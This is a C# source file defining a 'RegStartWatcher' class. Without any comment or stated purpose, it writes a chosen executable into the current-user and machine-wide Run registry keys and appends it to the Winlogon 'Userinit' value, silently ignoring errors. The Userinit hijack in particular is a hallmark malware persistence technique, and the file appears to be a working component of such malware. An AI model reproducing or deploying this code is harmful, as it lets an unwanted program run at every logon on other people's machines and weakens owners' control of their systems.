using Microsoft.Win32;
using System;
using System.Threading;

internal class RegStartWatcher
{
    private string ExePath;
    private Thread RegWatcherThread;
    private string StartUpTitle;
    private ThreadStart ThreadJob;

    public RegStartWatcher(string Title, string ExePath)
    {
        this.ThreadJob = new ThreadStart(this.WatchThread);
        this.RegWatcherThread = new Thread(this.ThreadJob);
        this.StartUpTitle = Title;
        this.ExePath = ExePath;
    }

    public void Start()
    {
        this.RegWatcherThread.Start();
    }

    private void WatchThread()
    {
        RegistryKey key;
        try
        {
            key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            if (key.GetValue(this.StartUpTitle) == null)
            {
                key.SetValue(this.StartUpTitle, this.ExePath);
            }
            else if (key.GetValue(this.StartUpTitle) != this.ExePath)
            {
                key.DeleteValue(this.StartUpTitle);
                key.SetValue(this.StartUpTitle, this.ExePath);
            }
        }
        catch
        {
        }
        try
        {
            key = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            if (key.GetValue(this.StartUpTitle) == null)
            {
                key.SetValue(this.StartUpTitle, this.ExePath);
            }
            else if (key.GetValue(this.StartUpTitle) != this.ExePath)
            {
                key.DeleteValue(this.StartUpTitle);
                key.SetValue(this.StartUpTitle, this.ExePath);
            }
        }
        catch
        {
        }
        try
        {
            key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
            string str = key.GetValue("Userinit").ToString();
            if (!str.Contains(this.ExePath))
            {
                key.SetValue("Userinit", str + this.ExePath + ",");
            }
        }
        catch
        {
        }
    }
}

